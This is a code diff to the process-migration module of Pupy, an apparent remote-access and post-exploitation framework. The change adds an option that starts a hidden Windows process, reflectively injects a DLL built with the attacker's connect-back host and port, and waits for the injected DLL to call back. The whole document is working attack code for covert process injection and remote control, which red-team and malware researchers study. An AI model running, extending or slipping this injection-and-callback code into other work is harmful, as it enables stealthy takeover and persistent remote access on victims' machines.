@@ -19,36 +19,45 @@ class MigrateModule(PupyModule):
 	max_clients=1
 	def init_argparse(self):
 		self.arg_parser = PupyArgumentParser(prog="migrate", description=self.__doc__)
-		self.arg_parser.add_argument('pid', type=int, help='pid')
+		group = self.arg_parser.add_mutually_exclusive_group(required=True)
+		group.add_argument('-c', '--create', metavar='<exe_path>',help='create a new process and inject into it')
+		group.add_argument('pid', nargs='?', type=int, help='pid')
 
 	@windows_only
 	def is_compatible(self):
 		pass
 
 	def run(self, args):
+		pid=None
+		self.client.load_package("psutil")
+		self.client.load_package("pupwinutils.processes")
+		if args.create:
+			p=self.client.conn.modules['pupwinutils.processes'].start_hidden_process(args.create)
+			pid=p.pid
+			self.success("%s created with pid %s"%(args.create,pid))
+		else:
+			pid=args.pid[0]
 		dllbuf=b""
 		isProcess64bits=False
 		#TODO automatically fill ip/port
-		self.client.load_package("psutil")
-		self.client.load_package("pupwinutils.processes")
 		self.success("looking for configured connect back address ...")
 		res=self.client.conn.modules['pupy'].get_connect_back_host()
 		host, port=res.rsplit(':',1)
 		self.success("address configured is %s:%s ..."%(host,port))
-		self.success("looking for process %s architecture ..."%args.pid)
-		if self.client.conn.modules['pupwinutils.processes'].is_process_64(args.pid):
+		self.success("looking for process %s architecture ..."%pid)
+		if self.client.conn.modules['pupwinutils.processes'].is_process_64(pid):
 			isProcess64bits=True
 			self.success("process is 64 bits")
 			dllbuff=pupygen.get_edit_pupyx64_dll(host, port)
 		else:
 			self.success("process is 32 bits")
 			dllbuff=pupygen.get_edit_pupyx86_dll(host, port)
-		self.success("injecting DLL in target process %s ..."%args.pid)
-		self.client.conn.modules['pupy'].reflective_inject_dll(args.pid, dllbuff, isProcess64bits)
+		self.success("injecting DLL in target process %s ..."%pid)
+		self.client.conn.modules['pupy'].reflective_inject_dll(pid, dllbuff, isProcess64bits)
 		self.success("DLL injected !")
 		self.success("waiting for a connection from the DLL ...")
 		while True:
-			c=has_proc_migrated(self.client, args.pid)
+			c=has_proc_migrated(self.client, pid)
 			if c:
 				self.success("got a connection from migrated DLL !")
 				c.desc["id"]=self.client.desc["id"]
